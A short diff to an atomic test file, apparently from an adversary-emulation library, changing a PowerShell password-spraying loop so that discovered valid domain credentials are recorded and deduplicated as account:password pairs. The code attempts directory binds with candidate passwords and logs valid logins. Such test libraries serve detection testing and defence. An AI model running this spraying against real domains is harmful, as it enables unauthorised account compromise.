@@ -36,9 +36,9 @@ atomic_tests:
           foreach ($password in $passwords){
             " [-] Attempting ${password} on account $($_.SamAccountName)." | Out-File -FilePath #{output_file} -Append
             if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
-              if (-not ($found.Contains($password))){
+              if (-not ($found.Contains("$($_.SamAccountName):${password}"))){
                 " [!] $($_.SamAccountName):${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-                $found += ,$password
+                $found += ,"$($_.SamAccountName):${password}"
               }
             }
           }
